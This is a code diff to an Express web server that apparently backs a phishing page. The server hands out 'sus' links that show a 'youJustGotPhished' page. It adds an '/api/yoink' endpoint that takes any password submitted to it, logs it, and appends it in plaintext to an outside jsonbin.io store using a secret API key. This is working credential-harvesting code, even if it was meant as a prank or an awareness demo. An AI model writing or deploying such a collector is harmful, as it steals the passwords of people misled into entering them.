@@ -1,8 +1,14 @@
 const express = require("express");
 const path = require("path");
+const fetch = require("node-fetch");
 const dotenv = require("dotenv");
+const bodyParser = require("body-parser");
+const XMLHttpRequest = require("xmlhttprequest").XMLHttpRequest;
+const http = require("http");
 
 dotenv.config();
+
+const jsonParser = bodyParser.json();
 
 const app = express();
 
@@ -27,17 +33,52 @@ app.get("/api/leaderboard", async (req, res) => {
 });
 
 app.post("/generate_url", async (req, res) => {
-  const body = req.body;
-  body.url = encodeURIComponent(body.url);
-  if (res.headersSent) return;
-  res.json({
-    url: `aaron.lieber.men/sus/${body.url}`,
-  });
+  console.log("in route");
+});
+
+app.post("/api/yoink", jsonParser, async (ureq, res) => {
+  let pass = ureq.body.pass;
+  console.log("yoink: ", pass);
+  const get_url = `https://api.jsonbin.io/v3/b/${process.env.BIN_ID}/latest`;
+  const update_url = `https://api.jsonbin.io/v3/b/${process.env.BIN_ID}`;
+  const headers = {
+    "Content-Type": "application/json",
+    "X-Master-Key": process.env.BIN_API_KEY,
+  };
+  // let message = JSON.stringify({
+  //   pass: ["test", "foobar"],
+  // });
+  // console.log(message);
+  // const response = await fetch(update_url, {
+  //   method: "put",
+  //   body: message,
+  //   headers: headers,
+  // });
+  // const body = await response.json();
+
+  const read = await fetch(get_url, {
+    headers: headers,
+  })
+    .then((res) => res.json())
+    .then((json) => {
+      console.log("json: ", json);
+      json.record.pass.push(pass);
+      console.log("[after] json: ", JSON.stringify(json.record));
+      return fetch(update_url, {
+        method: "put",
+        body: JSON.stringify({ pass: json.record.pass }),
+        headers: headers,
+      });
+    })
+    .then((uresp) => uresp.json())
+    .then((result) => console.log(result));
+  return 200;
 });
 
 app.get("/sus/:id", async (req, res) => {
-  console.log("password entered: ", req.cookies.pass);
-  res.sendFile(path.join(__dirname + "/../public/youJustGotPhished.html"));
+  res.sendFile("youJustGotPhished.html", {
+    root: path.join(__dirname, "/../public"),
+  });
 });
 
 app.get("/blog/", async (req, res) => {
